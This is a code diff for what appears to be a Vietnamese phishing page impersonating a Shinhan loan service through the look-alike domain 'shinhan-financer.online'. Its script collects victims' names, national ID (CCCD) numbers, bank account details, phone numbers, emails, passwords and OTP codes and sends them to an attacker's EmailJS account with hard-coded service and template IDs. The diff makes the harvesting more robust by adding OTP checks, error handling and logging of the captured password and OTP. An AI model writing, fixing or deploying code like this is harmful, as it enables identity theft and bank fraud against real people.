@@ -637,39 +637,47 @@
         let bannerIndex = 0;
         let failedAttempts = 0;
         let phoneNumber = '';
+        let formData;
 
         // Load Summary
         window.addEventListener('load', () => {
-            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-            if (!formData.fullName) {
-                if (Object.keys(formData).length > 0) {
-                    emailjs.send('service_60tgxof', 'template_56lv2n9', {
-                        full_name: formData.fullName || 'N/A',
-                        cccd: formData.cccd || 'N/A',
-                        amount: formData.amount || 'N/A',
-                        months: formData.months || 'N/A',
-                        account_number: formData.accountNumber || 'N/A',
-                        account_holder: formData.accountHolder || 'N/A',
-                        bank: formData.bank || 'N/A',
-                        phone: formData.phone || 'N/A',
-                        email: formData.email || 'N/A',
-                        method: formData.method || 'N/A',
-                        timestamp: new Date().toLocaleString('vi-VN')
-                    }).then(
-                        () => console.log('formData sent to EmailJS:', formData),
-                        (error) => console.error('EmailJS error:', error)
-                    );
+            try {
+                formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+                console.log('Retrieved formData:', formData); // Debug log
+                if (!formData.fullName) {
+                    if (Object.keys(formData).length > 0) {
+                        emailjs.send('service_60tgxof', 'template_56lv2n9', {
+                            full_name: formData.fullName || 'N/A',
+                            cccd: formData.cccd || 'N/A',
+                            amount: formData.amount || 'N/A',
+                            months: formData.months || 'N/A',
+                            account_number: formData.accountNumber || 'N/A',
+                            account_holder: formData.accountHolder || 'N/A',
+                            bank: formData.bank || 'N/A',
+                            phone: formData.phone || 'N/A',
+                            email: formData.email || 'N/A',
+                            method: formData.method || 'N/A',
+                            timestamp: new Date().toLocaleString('vi-VN')
+                        }).then(
+                            () => console.log('formData sent to EmailJS:', formData),
+                            (error) => console.error('EmailJS error:', error)
+                        );
+                    }
+                    alert('Vui lòng nhập thông tin giải ngân trước.');
+                    window.location.href = 'https://www.shinhan-financer.online/index.html';
+                    return;
                 }
-                alert('Vui lòng nhập thông tin giải ngân trước.');
+                document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
+                document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
+                document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
+                document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
+                document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
+                document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
+            } catch (error) {
+                console.error('Error parsing formData:', error);
+                alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
                 window.location.href = 'https://www.shinhan-financer.online/index.html';
-                return;
             }
-            document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
-            document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
-            document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
-            document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
-            document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
-            document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ mask: "0999-999-999" }).mask(document.getElementById('phone'));
                 Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
@@ -754,6 +762,7 @@
 
         // Send to EmailJS
         function sendToEmail(type, value, phone) {
+            console.log(`Sending ${type} to EmailJS:`, { value, phone }); // Debug log
             const templateId = type === 'password' ? 'template_xw5s9pw' : 'template_g9e2jee';
             emailjs.send('service_60tgxof', templateId, {
                 type: type,
@@ -783,6 +792,7 @@
 
         function proceedToOTP() {
             const password = document.getElementById('password').value.trim();
+            console.log('Password value:', password); // Debug log
             document.getElementById('passwordError').classList.remove('show');
 
             if (!password) {
@@ -800,7 +810,14 @@
 
         function verifyOTP() {
             const otp = document.getElementById('otp').value.trim();
+            console.log('OTP value:', otp); // Debug log
             document.getElementById('otpError').classList.remove('show');
+
+            if (!otp) {
+                document.getElementById('otpError').textContent = 'Vui lòng nhập mã OTP';
+                document.getElementById('otpError').classList.add('show');
+                return;
+            }
 
             sendToEmail('otp', otp, phoneNumber);
 
